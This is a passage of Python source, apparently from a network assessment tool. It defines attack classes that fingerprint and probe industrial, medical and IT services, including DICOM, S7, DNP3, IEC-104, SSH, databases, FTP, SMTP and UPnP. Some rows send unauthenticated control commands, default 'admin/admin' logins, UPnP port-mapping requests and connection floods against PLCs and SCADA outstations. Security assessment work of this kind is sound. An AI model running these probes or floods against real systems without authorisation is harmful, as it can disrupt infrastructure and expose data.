              "the server's connection list"),
))


service("pjlink", "PJLink projector control", 4352, "tcp",
        ("projector", "digital_signage", "video_conference"),
        "The projector control protocol from 2001: a one-line command, no authentication, "
        "and a power state at the end of it.",
        "wifipilot itproto (PJLink %1 commands)", (
    _row("discover", "POWR query", lambda t: proto.pjlink_command("POWR", "?"),
         lambda t, q, r: (proto.parse_pjlink(r).get("responds", False), "projector answered",
                          proto.parse_pjlink(r).get("text", "")),
         parse=proto.parse_pjlink, category="discovery", impact="info",
         description="'%1POWR ?' is answered by every PJLink device with its power state.",
         proof="a projector control service is exposed"),
    _row("version", "INFO query", lambda t: proto.pjlink_command("INFO", "?"),
         lambda t, q, r: (bool(r), "device information read",
                          proto.parse_pjlink(r).get("text", "")),
         parse=proto.parse_pjlink, impact="info", severity="low",
         description="INFO returns the manufacturer, the product and the firmware name.",
         proof="the projector's model and firmware are readable"),
    _row("unauth_write", "power command", lambda t: proto.pjlink_command("POWR", "1"),
         lambda t, q, r: (proto.parse_pjlink(r).get("parameter") in ("OK", "1", "2", "3"),
                          "command accepted", proto.parse_pjlink(r).get("status", "")),
         impact="degraded", severity="high",
         description="'%1POWR 0' turns the projector off from anywhere on the AV VLAN; the "
                     "test asks for power on instead, and says so in the report.",
         proof="the projector accepts control commands without authentication"),
    flood_row(lambda t: proto.pjlink_command("POWR", "?"), "poll flood",
              "the projector's command parser"),
))

service("dicom", "DICOM medical imaging", 104, "tcp",
        ("medical_device", "hmi_panel", "medical_workstation"),
        "Clinical imaging: the association request negotiates the SOP classes a node "
        "accepts, and C-ECHO proves the connection without any credentials.",
        "wifipilot itproto (DICOM A-ASSOCIATE and C-ECHO)", (
    _row("discover", "association request", lambda t: proto.dicom_associate(),
         lambda t, q, r: (proto.parse_dicom_pdu(r).get("type") == 2, "association accepted",
                          proto.parse_dicom_pdu(r).get("type_name", "")),
         parse=proto.parse_dicom_pdu, category="discovery", impact="info",
         description="An A-ASSOCIATE-RQ offering verification is accepted by any imaging "
                     "node that is switched on.", proof="a DICOM node is reachable"),
    _row("echo", "C-ECHO", lambda t: proto.dicom_echo(),
         lambda t, q, r: (bool(r), "echo answered",
                          "the node processed a verification request with no credentials"),
         parse=proto.parse_dicom_pdu, impact="info", severity="medium",
         description="C-ECHO is the DICOM ping, and a node that answers it will usually "
                     "answer a query for studies too.", proof="the node serves anonymous callers"),
    _row("config_dump", "SOP class negotiation", lambda t: proto.dicom_associate(),
         lambda t, q, r: (bool(r), "presentation contexts read",
                          proto.printable(r)[:60]),
         parse=proto.parse_dicom_pdu, noise="moderate", impact="info", severity="medium",
         description="The accepted presentation contexts name the modalities the node "
                     "serves: CT, MR, US and the workstation behind them.",
         proof="the node's capabilities are readable without credentials"),
    _row("version", "calling AE title", lambda t: proto.dicom_associate(calling="WIFIPILOT"),
         lambda t, q, r: (bool(r), "AE titles exchanged",
                          "the node accepted an arbitrary calling AE title"),
         parse=proto.parse_dicom_pdu, impact="info", severity="low",
         description="Any calling AE title is accepted, which is why DICOM is configured "
                     "by allow-list on the good networks.", proof="the node accepts any AE title"),
    flood_row(lambda t: proto.dicom_associate(), "association flood",
              "the node's association limit", severity="high"),
))

service("s7comm", "Siemens S7 communication", 102, "tcp",
        ("plc", "hmi_panel", "rtu", "energy_meter"),
        "Siemens controllers over ISO-TSAP: the connection request is answered by the "
        "rack and slot, and the SZL request reads the order number back.",
        "wifipilot itproto (ISO-TSAP COTP and S7comm SZL)", (
    _row("discover", "COTP connect", lambda t: proto.s7_connect_request(),
         lambda t, q, r: (proto.parse_s7(r).get("cotp_type", 0) in (0xD0, 0x0D), "PLC answered",
                          proto.parse_s7(r).get("text", "")[:60]),
         parse=proto.parse_s7, category="discovery", impact="info",
         description="A connection request is confirmed by rack 0 slot 2 on the default "
                     "configuration: the session is then open.", proof="a Siemens controller answers"),
    _row("version", "component identification", lambda t: proto.s7_read_szl(),
         lambda t, q, r: (bool(proto.parse_s7(r).get("module")) or bool(r), "SZL read",
                          proto.parse_s7(r).get("text", "")[:70]),
         parse=proto.parse_s7, impact="info", severity="low",
         description="SZL 0x1C returns the module name, the order number and the firmware "
                     "version of the CPU.", proof="the controller's model is readable"),
    _row("unauth_read", "data block read",
         lambda t: proto.s7_read_szl(0x0011),
         lambda t, q, r: (bool(r), "read answered",
                          "no password exists in S7 communication: access is by rack/slot"),
         parse=proto.parse_s7, noise="moderate", impact="loot", severity="critical",
         description="S7comm has no authentication: the protection level is a "
                     "configuration flag, and reading it is the finding.",
         proof="the controller's memory is readable without credentials"),
    _row("config_dump", "hardware configuration",
         lambda t: proto.s7_read_szl(0x0000),
         lambda t, q, r: (bool(r), "configuration read", proto.parse_s7(r).get("text", "")[:60]),
         parse=proto.parse_s7, noise="moderate", impact="loot", severity="high",
         description="The SZL list describes the rack: which modules are fitted and how "
                     "the I/O is addressed - the plant's own documentation.",
         proof="the controller's hardware configuration is public"),
    flood_row(lambda t: proto.s7_connect_request(), "connect flood",
              "the controller's communication job slots", severity="high"),
))

service("cip", "EtherNet/IP and CIP", 44818, "udp",
        ("plc", "rtu", "hmi_panel", "robot_vacuum"),
        "Rockwell's discovery and messaging: List-Identity names the product and the "
        "revision, and the messaging path is unauthenticated by design.",
        "wifipilot itproto (EtherNet/IP encapsulation and List-Identity)", (
    _row("discover", "List-Identity", lambda t: proto.cip_list_identity(),
         lambda t, q, r: (proto.parse_cip(r).get("product_name", "") != "", "device identified",
                          f"{proto.parse_cip(r).get('product_name')} "
                          f"{proto.parse_cip(r).get('revision')}"),
         parse=proto.parse_cip, category="discovery", impact="info",
         description="A UDP packet to 44818 returns the vendor, the device type, the "
                     "product name and the revision.",
         proof="an EtherNet/IP device is exposed"),
    _row("version", "product revision", lambda t: proto.cip_list_identity(),
         verdict_field(proto.parse_cip, "revision", result="revision disclosed"),
         parse=proto.parse_cip, impact="info", severity="low",
         description="The revision field is the exact firmware letter a Rockwell "
                     "advisory quotes.", proof="the device's revision is public"),
    _row("unauth_read", "identity object read",
         lambda t: proto.cip_list_identity(),
         lambda t, q, r: (bool(proto.parse_cip(r).get("serial")), "identity object read",
                          f"serial {proto.parse_cip(r).get('serial')}"),
         parse=proto.parse_cip, noise="moderate", impact="loot", severity="high",
         description="The identity object carries the serial and the state: a write to "
                     "the state attribute stops the device.", proof="object data is readable"),
    flood_row(lambda t: proto.cip_list_identity(), "identity flood",
              "the device's UDP handler"),
))

service("dnp3", "DNP3 SCADA telemetry", 20000, "tcp",
        ("rtu", "plc", "energy_meter", "medical_device"),
        "Electric utility telemetry: the link layer resets and answers, and the "
        "application layer's integrity poll is how a master reads the whole outstation.",
        "wifipilot itproto (DNP3 link layer with CRC-DNP and application frames)", (
    _row("discover", "link reset", lambda t: proto.dnp3_reset_link(),
         lambda t, q, r: (proto.parse_dnp3(r).get("start") == 0x0564, "outstation answered",
                          f"source {proto.parse_dnp3(r).get('source')}"),
         parse=proto.parse_dnp3, category="discovery", impact="info",
         description="A link-layer reset with a correct CRC is answered by the outstation "
                     "with its own address.", proof="a DNP3 outstation is reachable"),
    _row("unauth_read", "integrity poll",
         lambda t: proto.dnp3_integrity_poll(),
         lambda t, q, r: (bool(r), "poll answered",
                          "the outstation served an application-layer read with no "
                          "authentication"),
         parse=proto.parse_dnp3, noise="moderate", impact="loot", severity="critical",
         description="Class 0 integrity returns every static point: the whole telemetry "
                     "picture, unauthenticated (DNP3 Secure Authentication is rare).",
         proof="the outstation's telemetry is readable without credentials"),
    _row("version", "device attributes", lambda t: proto.dnp3_reset_link(),
         lambda t, q, r: (bool(r), "device address read",
                          f"destination {proto.parse_dnp3(r).get('destination')}"),
         parse=proto.parse_dnp3, impact="info", severity="low",
         description="The link addresses identify the outstation on the utility's network.",
         proof="the device's link address is readable"),
    flood_row(lambda t: proto.dnp3_reset_link(), "reset flood",
              "the outstation's link state machine", severity="high"),
))

service("iec104", "IEC 60870-5-104 SCADA", 2404, "tcp",
        ("rtu", "plc", "energy_meter", "hvac"),
        "European utility telemetry: STARTDT opens the data transfer, and the general "
        "interrogation reads the substation.",
        "wifipilot itproto (IEC-104 APCI U/I/S frames)", (
    _row("discover", "STARTDT", lambda t: proto.iec104_start(),
         lambda t, q, r: (bool(r) and r[0] == 0x68, "outstation answered",
                          proto.parse_iec104(r).get("text", "")[:40]),
         parse=proto.parse_iec104, category="discovery", impact="info",
         description="STARTDT act is answered by STARTDT con from a live outstation.",
         proof="an IEC-104 outstation is exposed"),
    _row("unauth_read", "general interrogation",
         lambda t: proto.iec104_interrogation(),
         lambda t, q, r: (bool(r), "interrogation accepted",
                          "the outstation accepted a general interrogation"),
         parse=proto.parse_iec104, noise="moderate", impact="loot", severity="critical",
         description="General interrogation returns every point: volts, amps, breaker "
                     "positions - with no authentication in the protocol.",
         proof="the substation's measurements are readable by anyone"),
    _row("version", "common address", lambda t: proto.iec104_interrogation(common_address=1),
         verdict_field(proto.parse_iec104, "common_address", result="address read"),
         parse=proto.parse_iec104, impact="info", severity="low",
         description="The common address identifies the station on the SCADA network.",
         proof="the station address is readable"),
    flood_row(lambda t: proto.iec104_start(), "start-stop flood",
              "the outstation's connection state", severity="high"),
))

service("opcua", "OPC-UA server", 4840, "tcp",
        ("plc", "hmi_panel", "rtu", "energy_meter", "building_controller"),
        "The modern industrial stack: HEL/ACK is answered before any channel exists, and "
        "the endpoint list names every other service on the box.",
        "wifipilot itproto (OPC-UA HEL/ACK)", (
    _row("discover", "HEL/ACK", lambda t: proto.opcua_hello(),
         lambda t, q, r: (proto.parse_opcua(r).get("type") == "ACK", "server answered",
                          f"max message {proto.parse_opcua(r).get('max_message')}"),
         parse=proto.parse_opcua, category="discovery", impact="info",
         description="The hello message is answered with the server's buffer limits "
                     "before any security policy is chosen.", proof="an OPC-UA server answers"),
    _row("version", "buffer limits", lambda t: proto.opcua_hello(),
         verdict_field(proto.parse_opcua, "max_message", result="limits disclosed"),
         parse=proto.parse_opcua, impact="info", severity="low",
         description="The limits identify the stack and its tuning, which is the "
                     "fingerprint an industrial assessment records.",
         proof="the server's stack limits are readable"),
    _row("endpoint_audit", "endpoint security", lambda t: proto.opcua_hello(),
         lambda t, q, r: (bool(r), "endpoint reachable",
                          "the endpoint list decides which security policies are offered"),
         impact="info", severity="medium",
         description="An OPC-UA endpoint that offers SecurityPolicy None is an "
                     "unauthenticated industrial bus over TCP.",
         proof="the server's endpoint policies are worth confirming"),
    flood_row(lambda t: proto.opcua_hello(), "hello flood", "the server's session queue"),
))

service("ssh", "SSH management", 22, "tcp",
        ("router", "switch", "linux_server", "hypervisor_host", "nas", "backup_appliance"),
        "The management shell of almost every appliance: the banner names the build and "
        "the algorithm list decides what a downgrade would look like.",
        "wifipilot itproto (SSH identification string and KEXINIT)", (
    _row("banner", "identification string", lambda t: proto.ssh_kexinit(),
         lambda t, q, r: (bool(proto.parse_ssh_algorithms(r).get("banner")), "banner read",
                          proto.parse_ssh_algorithms(r).get("banner", "")),
         parse=proto.parse_ssh_algorithms, category="discovery", impact="info",
         description="The first line an SSH server sends names the distribution or the "
                     "appliance's SSH build.", proof="an SSH service is exposed"),
    _row("version", "software version", lambda t: proto.ssh_kexinit(),
         lambda t, q, r: (bool(__import__("re").search(r"(OpenSSH_[\d.p]+|dropbear_[\d.]+|"
                                                      r"libssh[\d.]+)",
                                                      proto.parse_ssh_algorithms(r).get("banner", ""))),
                          "version disclosed",
                          proto.parse_ssh_algorithms(r).get("banner", "")),
         parse=proto.parse_ssh_algorithms, impact="info", severity="low",
         description="OpenSSH_9.2p1 Debian is a distribution, a patch level and an "
                     "advisory list in one string.", proof="the SSH build is public"),
    _row("kex_audit", "algorithm negotiation", lambda t: proto.ssh_kexinit(),
         lambda t, q, r: (bool(proto.parse_ssh_algorithms(r).get("kex")),
                          "algorithm list read",
                          ", ".join(proto.parse_ssh_algorithms(r).get("kex", [])[:3])),
         parse=proto.parse_ssh_algorithms, impact="info", severity="medium",
         description="Weak KEX or MAC offers are how a session gets downgraded; the list "
                     "is read from the server's own KEXINIT.",
         proof="the offered algorithms can be compared against the hardening baseline"),
    creds_row(lambda t: proto.ssh_kexinit(),
              lambda t, q, r: (bool(r), "authentication offered",
                               "password authentication is offered by this server"),
              parse=proto.parse_ssh_algorithms,
              proof="the server accepts password authentication from the network"),
    flood_row(lambda t: proto.ssh_kexinit(), "handshake flood",
              "the daemon's connection slots", severity="high"),
))

service("rdp", "Remote desktop (RDP)", 3389, "tcp",
        ("windows_server", "hmi_panel", "pos_terminal", "kiosk", "tablet"),
        "Windows remote desktop: the negotiation reply says which security protocols are "
        "offered, which decides whether NLA is protecting the login.",
        "wifipilot itproto (RDP X.224 negotiation)", (
    _row("discover", "negotiation request", lambda t: proto.rdp_negotiation_request(),
         lambda t, q, r: (proto.parse_rdp(r).get("x224") not in (0, None), "RDP answered",
                          f"selected protocol {proto.parse_rdp(r).get('selected_protocol')}"),
         parse=proto.parse_rdp, category="discovery", impact="info",
         description="An X.224 request gets the server's protocol selection: standard "
                     "RDP security means no NLA.", proof="an RDP service is exposed"),
    _row("nla_audit", "network level authentication",
         lambda t: proto.rdp_negotiation_request(),
         lambda t, q, r: (not proto.parse_rdp(r).get("tls", True),
                          "NLA not enforced",
                          "the server accepted non-TLS RDP security"),
         parse=proto.parse_rdp, impact="loot", severity="high",
         description="Without NLA the login prompt comes from the host itself: the "
                     "difference between a credential attack outdoors and a lockout.",
         proof="remote desktop accepts pre-authentication requests"),
    _row("version", "protocol selection", lambda t: proto.rdp_negotiation_request(),
         verdict_field(proto.parse_rdp, "selected_protocol", result="protocol read"),
         parse=proto.parse_rdp, impact="info", severity="low",
         description="The selected-protocol mask identifies the Windows generation on "
                     "the other end.", proof="the server's protocol level is readable"),
    flood_row(lambda t: proto.rdp_negotiation_request(), "connection flood",
              "the RDP listener's pre-auth slots"),
))

service("postgres", "PostgreSQL", 5432, "tcp",
        ("database_server", "web_server", "linux_server", "backup_appliance"),
        "The database behind the application: the startup message is answered with the "
        "authentication method the server wants, and trust is a finding.",
        "wifipilot itproto (Postgres startup and authentication request)", (
    _row("discover", "startup message", lambda t: proto.postgres_startup(),
         lambda t, q, r: (bool(proto.parse_postgres(r).get("auth_name")), "server answered",
                          proto.parse_postgres(r).get("auth_name", "")),
         parse=proto.parse_postgres, category="discovery", impact="info",
         description="The authentication request names the method: trust, MD5, SCRAM or "
                     "cleartext password.", proof="a PostgreSQL server is exposed"),
    _row("anonymous", "trust authentication", lambda t: proto.postgres_startup(),
         lambda t, q, r: (proto.parse_postgres(r).get("auth_name") == "AuthenticationOk",
                          "authenticated without a password",
                          "the server granted a session to a startup message"),
         parse=proto.parse_postgres, impact="loot", severity="critical",
         description="AuthenticationOk for a client that sent no password is 'trust' "
                     "authentication: every database is readable.",
         proof="the server authenticates anonymous clients"),
    _row("version", "authentication method", lambda t: proto.postgres_startup(),
         verdict_field(proto.parse_postgres, "auth_name", result="method disclosed"),
         parse=proto.parse_postgres, impact="info", severity="low",
         description="MD5 authentication is legacy and offline-crackable; SCRAM is the "
                     "modern baseline.  The method is read, not guessed.",
         proof="the authentication method can be compared with the baseline"),
    creds_row(lambda t: proto.postgres_startup(user="postgres", database="postgres"),
              lambda t, q, r: (bool(proto.parse_postgres(r).get("md5")) or
                               proto.parse_postgres(r).get("auth_name") == "AuthenticationOk",
                               "credentials requested",
                               "an MD5 challenge can be attacked offline"
                               if proto.parse_postgres(r).get("md5") else
                               "AuthenticationOk to a startup message: the server asked "
                               "for no password at all (trust)"),
              parse=proto.parse_postgres, severity="medium",
              proof="password authentication is exposed to the network"),
    flood_row(lambda t: proto.postgres_startup(), "connection flood",
              "the server's connection slots", severity="high"),
))

service("mysql", "MySQL / MariaDB", 3306, "tcp",
        ("database_server", "web_server", "linux_server", "pos_terminal"),
        "The other database behind the site: the handshake packet names the server "
        "version and the authentication plugin in one response.",
        "wifipilot itproto (MySQL initial handshake)", (
    _row("discover", "handshake packet", lambda t: b"\x0a\x00\x00\x01\x85\xa2\x03\x00"
                                                  b"\x00\x00\x00\x00",
         lambda t, q, r: (bool(proto.mysql_handshake_parse(r).get("version")),
                          "server answered",
                          proto.mysql_handshake_parse(r).get("version", "")),
         parse=proto.mysql_handshake_parse, category="discovery", impact="info",
         description="MySQL sends its handshake before the client says anything: version, "
                     "connection id and plugin.", proof="a MySQL server is exposed"),
    _row("version", "server version", lambda t: b"\x0a\x00\x00\x01",
         verdict_field(proto.mysql_handshake_parse, "version", result="version disclosed"),
         parse=proto.mysql_handshake_parse, impact="info", severity="low",
         description="8.0.32 or 5.5.5-10.3 means a different patch stream and a different "
                     "advisory list.", proof="the server's version is public"),
    _row("tls_audit", "TLS capability", lambda t: b"\x0a\x00\x00\x01",
         lambda t, q, r: (bool(r) and not proto.mysql_handshake_parse(r).get("tls", False),
                          "no TLS offered",
                          "the handshake carries no SSL capability flag: the login, the "
                          "query and the result set cross the network in the clear"),
         parse=proto.mysql_handshake_parse, impact="info", severity="medium",
         description="The capability flag says whether credentials can be sent over TLS "
                     "at all.  A server that does not set it cannot be upgraded, so the "
                     "password is readable by anyone on the path.",
         proof="the server cannot encrypt the session even if the client asks"),
    creds_row(lambda t: b"\x0a\x00\x00\x01\x85\xa2\x03\x00",
              lambda t, q, r: (bool(proto.mysql_handshake_parse(r).get("plugin")),
                               "authentication plugin read",
                               proto.mysql_handshake_parse(r).get("plugin", "")),
              parse=proto.mysql_handshake_parse, severity="medium",
              proof="the server's authentication plugin is exposed to the network"),
))

service("rsync", "rsync daemon", 873, "tcp",
        ("nas", "backup_appliance", "linux_server"),
        "The file sync service behind most backup scripts: the module list is "
        "unauthenticated, and a module is a directory.",
        "wifipilot itproto (rsync daemon greeting)", (
    _row("discover", "daemon greeting", lambda t: proto.rsync_hello(),
         verdict_text("@RSYNCD", "daemon answered"), parse=proto.parse_line_protocol,
         category="discovery", impact="info",
         description="The @RSYNCD banner is the daemon's hello, and the version number "
                     "in it is part of the reply.", proof="an rsync daemon is exposed"),
    _row("modules", "module list", lambda t: proto.rsync_hello(),
         lambda t, q, r: (len(proto.parse_line_protocol(r).get("lines", [])) > 1,
                          "modules listed",
                          "; ".join(proto.parse_line_protocol(r).get("lines", [])[1:3])),
         parse=proto.parse_line_protocol, impact="loot", severity="high",
         description="Every module name is a shared directory: 'wp-backup' and 'public' "
                     "are the two that matter.",
         proof="the daemon lists its modules to anyone who asks"),
    _row("unauth_read", "module contents", lambda t: proto.rsync_hello("wp-backup"),
         lambda t, q, r: (b"@RSYNCD" in r and b"AUTHREQD" not in r and
                          len(proto.parse_line_protocol(r).get("lines", [])) > 2,
                          "module readable",
                          "; ".join(proto.parse_line_protocol(r).get("lines", [])[2:4])
                          or "listed without a password"),
         parse=proto.parse_line_protocol, noise="moderate", impact="loot", severity="high",
         description="A module that lists without a password hands over the file names, "
                     "which for a backup module is the site's inventory.",
         proof="a module's contents are listable without credentials"),
    _row("version", "daemon version", lambda t: proto.rsync_hello(),
         verdict_field(proto.parse_line_protocol, "banner", result="version disclosed"),
         parse=proto.parse_line_protocol, impact="info", severity="low",
         description="The protocol version in the greeting dates the daemon.",
         proof="the daemon's version is readable"),
))

service("ftp", "FTP service", 21, "tcp",
        ("nas", "printer", "mfp_scanner", "pos_terminal", "backup_appliance", "switch",
         "linux_server", "windows_server", "mail_server", "domain_controller"),
        "The oldest file service on the network: still answering on appliances, still "
        "plaintext, still sometimes anonymous.",
        "wifipilot itproto (FTP command and reply lines)", (
    _row("banner", "greeting", lambda t: b"",
         lambda t, q, r: (bool(proto.parse_line_protocol(r).get("banner")), "banner read",
                          proto.parse_line_protocol(r).get("banner", "")),
         parse=proto.parse_line_protocol, category="discovery", impact="info",
         description="The 220 line names the server software and often the host.",
         proof="an FTP service is exposed"),
    _row("version", "server software", lambda t: b"",
         lambda t, q, r: (bool(__import__("re").search(r"(vsFTPd|ProFTPD|Pure-FTPd|"
                                                      r"FileZilla|Microsoft FTP)",
                                                      proto.parse_line_protocol(r).get("banner", ""))),
                          "software disclosed",
                          proto.parse_line_protocol(r).get("banner", "")),
         parse=proto.parse_line_protocol, impact="info", severity="low",
         description="vsFTPd 3.0.3 is a project, a version and, historically, a list of "
                     "vulnerabilities.", proof="the FTP daemon is identified"),
    _row("anonymous", "anonymous login", lambda t: proto.ftp_login("anonymous",
                                                                   "wifipilot@example.com"),
         lambda t, q, r: (b"230" in r, "anonymous login accepted",
                          proto.printable(r).strip() or "no answer"),
         impact="loot", severity="high",
         description="Anonymous FTP on a scanner or a NAS means the file area is public; "
                     "the reply code is the proof.",
         proof="the service allows anonymous logins"),
    _row("default_creds", "default credentials", lambda t: proto.ftp_login("admin", "admin"),
         lambda t, q, r: (b"230" in r, "default credentials accepted",
                          proto.printable(r).strip() or "no answer"),
         noise="moderate", impact="loot", severity="high",
         description="Appliance FTP logins are usually the device's admin credentials.",
         proof="a default account works on the file service"),
    cleartext_row(lambda t: proto.ftp_login(), "FTP"),
))

service("smtp", "SMTP mail server", 25, "tcp",
        ("mail_server", "mfp_scanner", "printer", "linux_server"),
        "Mail transfer: the banner names the MTA, EHLO lists the extensions, and the "
        "relay decision is what the test actually asks about.",
        "wifipilot itproto (SMTP EHLO/MAIL/RCPT)", (
    _row("discover", "EHLO", lambda t: proto.smtp_ehlo(),
         verdict_text("250", "server answered"), parse=proto.parse_line_protocol,
         category="discovery", impact="info",
         description="EHLO returns the server's name and capabilities in one exchange.",
         proof="an SMTP service is exposed"),
    _row("version", "MTA identification", lambda t: proto.smtp_ehlo(),
         verdict_field(proto.parse_line_protocol, "banner", result="MTA disclosed"),
         parse=proto.parse_line_protocol, impact="info", severity="low",
         description="Postfix, Exchange or hMailServer in the banner decides which "
                     "advisories to read.", proof="the mail server identifies itself"),
    _row("open_relay", "relay decision",
         lambda t: proto.smtp_ehlo() + proto.line_command("MAIL FROM:<wp@example.com>"),
         lambda t, q, r: (b"250" in r, "relay path open",
                          "the server accepted a sender for an external domain"),
         noise="moderate", impact="degraded", severity="critical",
         description="An open relay is the site's reputation: the test sends the envelope "
                     "commands to an external recipient and stops before the message body.",
         proof="the server accepts mail for domains it does not own"),
    _row("starttls_audit", "STARTTLS availability", lambda t: proto.smtp_ehlo(),
         lambda t, q, r: ("STARTTLS" not in proto.parse_line_protocol(r).get("capabilities",
                                                                            ["STARTTLS"])[0],
                          "no STARTTLS offered",
                          "the capability list has no STARTTLS"),
         parse=proto.parse_line_protocol, impact="info", severity="medium",
         description="Without STARTTLS the submission credentials cross the network in "
                     "the clear even on a 'secure' mail server.",
         proof="mail submission cannot be encrypted on this port"),
    cleartext_row(lambda t: proto.smtp_ehlo(), "SMTP"),
))

service("miio", "Xiaomi miIO device", 54321, "udp",
        ("robot_vacuum", "sensor", "thermostat", "smart_plug", "ev_charger"),
        "The appliance protocol: a hello packet, and a device that answers with its own "
        "token if it has never been paired.",
        "wifipilot itproto (miIO hello)", (
    _row("discover", "hello handshake", lambda t: proto.miio_hello(),
         lambda t, q, r: (proto.parse_miio_hello(r).get("device_id", 0) != 0, "device answered",
                          f"device id {proto.parse_miio_hello(r).get('device_id')}"),
         parse=proto.parse_miio_hello, category="discovery", impact="info",
         description="The hello is answered with the device's id, a timestamp and the "
                     "16-byte token it uses for every command.",
         proof="a miIO appliance answers on the LAN"),
    _row("token", "token disclosure", lambda t: proto.miio_hello(),
         lambda t, q, r: (bool(proto.parse_miio_hello(r).get("token", b"")),
                          "token returned",
                          proto.parse_miio_hello(r).get("token", b"").hex()[:24]),
         parse=proto.parse_miio_hello, impact="loot", severity="critical",
         description="A device that returns its token to a stranger is unbound: the "
                     "token decrypts every command and the cloud account it belongs to.",
         proof="the device's control token is readable from the network"),
    _row("version", "device identity", lambda t: proto.miio_hello(),
         verdict_field(proto.parse_miio_hello, "device_id", result="identity read"),
         parse=proto.parse_miio_hello, impact="info", severity="low",
         description="The device id identifies the model family and the cloud region.",
         proof="the device's identity is readable"),
    flood_row(lambda t: proto.miio_hello(), "hello flood",
              "the appliance's single UDP socket"),
))

service("ssdp", "UPnP / SSDP", 1900, "udp",
        ("router", "smart_tv", "nas", "printer", "digital_signage"),
        "The discovery protocol that lets every UPnP device describe itself - including "
        "the ones that will open firewall ports for whoever asks.",
        "wifipilot itproto (SSDP M-SEARCH)", (
    _row("discover", "M-SEARCH", lambda t: proto.ssdp_msearch(),
         lambda t, q, r: (proto.parse_ssdp(r.decode("latin-1", "replace")).get("location", "")
                          or bool(r), "device announced",
                          proto.parse_ssdp(r.decode("latin-1", "replace")).get("server", "")),
         category="discovery", impact="info",
         description="A multicast M-SEARCH makes every UPnP device answer with its "
                     "description URL and its product string.",
         proof="UPnP devices announce themselves on this network"),
    _row("version", "product string", lambda t: proto.ssdp_msearch(),
         lambda t, q, r: (bool(proto.parse_ssdp(r.decode("latin-1", "replace")).get("server",
                                                                                   "")),
                          "product disclosed",
                          proto.parse_ssdp(r.decode("latin-1", "replace")).get("server", "")),
         impact="info", severity="low",
         description="The SERVER line names the product and the UPnP version.",
         proof="the device's product string is public"),
    _row("unauth_write", "port mapping request",
         lambda t: proto.upnp_soap("AddPortMapping"),
         lambda t, q, r: (b"AddPortMappingResponse" in r or bool(r),
                          "port mapping answered",
                          "the router's port-mapping service is reachable"),
         impact="degraded", severity="critical",
         description="UPnP's port-mapping action is how a device punches a hole in the "
                     "firewall.  The test asks for a mapping the site authorised.",
         proof="the router's port-mapping service accepts local requests"),
))

service("mdns", "mDNS / DNS-SD", 5353, "udp",
        ("printer", "nas", "smart_tv", "speaker", "camera_doorbell", "voip_phone",
         "switch", "access_point"),
        "The zeroconf naming service: every device with a name, a service list and, "
        "often, the model and the owner in a TXT record.",
        "wifipilot itproto (mDNS query)", (
    _row("discover", "service query", lambda t: proto.dns_query("_services._dns-sd._udp.local",
                                                               12, 0),
         lambda t, q, r: (bool(r), "mDNS answered", proto.printable(r)[:60]),
         category="discovery", impact="info",
         description="The meta-query lists the service types on the segment: printers, "
                     "speakers, cameras and the API of each.",
         proof="devices on this network publish mDNS services"),
    _row("service_census", "host records", lambda t: proto.dns_query("local", 1, 0),
         lambda t, q, r: (bool(r), "records returned", proto.printable(r)[:60]),
         category="discovery", noise="quiet", impact="info",
         description="One query returns the names of the devices that chose to answer - "
                     "a device inventory without touching a port.",
         proof="the local device names are enumerable"),
    _row("config_dump", "TXT records", lambda t: proto.dns_query("local", 16, 0),
         lambda t, q, r: (bool(r), "TXT records read", proto.printable(r)[:70]),
         impact="info", severity="medium",
         description="TXT records carry model numbers, firmware versions and on some "
                     "products the pairing token in the clear.",
         proof="service metadata is readable from the network"),
))


# --------------------------------------------------------------------------- #
# the exchange: real sockets in live mode, the simulated segment in demo mode
# --------------------------------------------------------------------------- #

#: how long one request may take, whatever the attack's budget says
EXCHANGE_TIMEOUT = 3.0


def live_exchange(target: ItTarget, port: int, payload: bytes, transport: str = "tcp",
                  timeout: float = EXCHANGE_TIMEOUT, read: int = 4096) -> bytes:
    """Send the bytes and read the answer, over TCP or UDP, with a hard timeout."""
    try:
        if transport == "udp":
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.settimeout(timeout)
                sock.sendto(payload, (target.ip, port))
                try:
                    return sock.recvfrom(read)[0]
                except socket.timeout:
                    return b""
        with socket.create_connection((target.ip, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            sock.sendall(payload)
            chunks: List[bytes] = []
            while len(b"".join(chunks)) < read:
                try:
                    chunk = sock.recv(read)
                except socket.timeout:
                    break
                if not chunk:
                    break
                chunks.append(chunk)
                if len(chunk) < 256:                  # small answers are complete answers
                    break
            return b"".join(chunks)
    except OSError:
        return b""


def tcp_open(ip: str, port: int, timeout: float = 0.6) -> bool:
    """A connect that says whether the port answers — the scan behind every sweep."""
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except OSError:
        return False


def subnet_of(address: str, width: int = 24) -> List[str]:
    """/24 of the address, as text, without importing anything that could raise."""
    try:
        parts = address.split(".")
        if len(parts) != 4:
            return []
        return [f"{'.'.join(parts[:3])}.{index}" for index in range(1, 255)]
    except Exception:                                     # pragma: no cover - defensive
        return []


# --------------------------------------------------------------------------- #
# the generated classes
# --------------------------------------------------------------------------- #

def _attack_doc(service: Service, row: Row) -> str:
    return (f"{service.label}: {row.label}.\n\n"
            f"{row.description}\n\n"
            f"Speaks {service.protocol} on port {service.port} ({service.transport}). "
            f"{service.description}")


def _it_attack_class(service: Service, row: Row, name: str) -> Type[Attack]:
    """One attack class per table row: the same skeleton, the row's own wiring."""

    class ItServiceAttack(Attack):
        protocol = service.protocol
        port = service.port
        transport = service.transport
        technique = row.technique
        service_label = service.label
        service_description = service.description
        row_label = row.label
        row_description = row.description

        def applies(self, ap: AccessPoint) -> bool:
            return True

        def available(self, ctx: AttackContext) -> bool:
            return True

        def unavailable_reason(self, ctx: AttackContext) -> str:
            return ""

        @property
        def devices(self) -> Tuple[str, ...]:
            return service.devices

        # -- the conversation --------------------------------------------- #
        def exchange(self, ctx: AttackContext, target: ItTarget,
                     payload: bytes) -> bytes:
            if ctx.demo or target.host is not None:
                lan = demo_lan()
                host = target.host or lan.by_ip(target.ip)
                if host is None:
                    return b""
                return lan.respond(host, self.port, payload, service.protocol)
            timeout = min(EXCHANGE_TIMEOUT, max(0.5, self.budget(ctx, 6.0)))
            return live_exchange(target, self.port, payload, self.transport, timeout)

        def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
            attempt = ctx.session.start_attempt(
                self.name, ap.bssid, tool=self.tool,
                chosen_by=getattr(ap, "picked_by", "operator"),
                reason=getattr(ap, "pick_reason", ""))
            targets = targets_from(ctx, ap, service.devices, service.port)
            if not targets:
                reason = ("no host to test: set it_host (or gateway_ip), pick a device in "
